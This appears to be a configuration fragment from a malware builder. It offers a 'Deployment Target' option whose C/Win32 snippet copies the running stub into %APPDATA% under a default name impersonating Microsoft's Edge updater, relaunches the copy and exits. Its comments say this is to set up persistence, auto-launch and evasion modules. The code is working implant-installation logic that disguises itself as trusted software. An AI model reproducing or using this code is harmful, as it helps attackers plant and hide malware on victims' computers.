- header: Deployment Target
  template: installation
  display: Deployment Target
  allowMultiple: false
  items:
  - id: None
    display: Run In-Place
    default: true
    requires: []
    snippet: |
      // No installation — persistence will be tied to the current launch path.

  - id: AppDataDir
    display: APPDATA Install Directory (User-Level)
    default: false
    requires: []
    inputs:
    - id: appdata_install_dir
      label: "Sub-directory under %APPDATA%"
      type: textbox
      defaultValue: "Microsoft\\EdgeUpdate"
      placeholder: "Microsoft\\EdgeUpdate"
    - id: appdata_install_file
      label: "Installed Filename"
      type: textbox
      defaultValue: "MicrosoftEdgeUpdate.exe"
      placeholder: "MicrosoftEdgeUpdate.exe"
    snippet: |
      // Installation: Copy stub to %APPDATA%\<dir>\<file>.
      // Creates the directory tree if it does not exist.
      // If already running from the install path, skips copy and relaunch.
      // Otherwise copies itself there, launches the installed copy, and exits —
      // so all subsequent snippets (auto-launch, evasion) run from the stable path.
      {
          WCHAR _inst_src[MAX_PATH] = {0};
          WCHAR _inst_dir[MAX_PATH] = {0};
          WCHAR _inst_dst[MAX_PATH] = {0};
          wcscpy_s(_inst_src, MAX_PATH, wash_licensepayload_path());
          ExpandEnvironmentStringsW(L"%APPDATA%\\$appdata_install_dir$", _inst_dir, MAX_PATH);
          SHCreateDirectoryExW(NULL, _inst_dir, NULL);
          wsprintfW(_inst_dst, L"%s\\$appdata_install_file$", _inst_dir);
          if (_wcsicmp(_inst_src, _inst_dst) != 0) {
              if (CopyFileW(_inst_src, _inst_dst, FALSE)) {
                  STARTUPINFOW        _inst_si = {sizeof(_inst_si)};
                  PROCESS_INFORMATION _inst_pi = {0};
                  if (CreateProcessW(_inst_dst, NULL, NULL, NULL, FALSE,
                                     0, NULL, NULL, &_inst_si, &_inst_pi)) {
                      CloseHandle(_inst_pi.hProcess);
                      CloseHandle(_inst_pi.hThread);
                  }
                  return 0;
              }
          }
          wcscpy_s(wash_install_path, MAX_PATH, _inst_dst);
          wash_track(wash_install_path);
      }

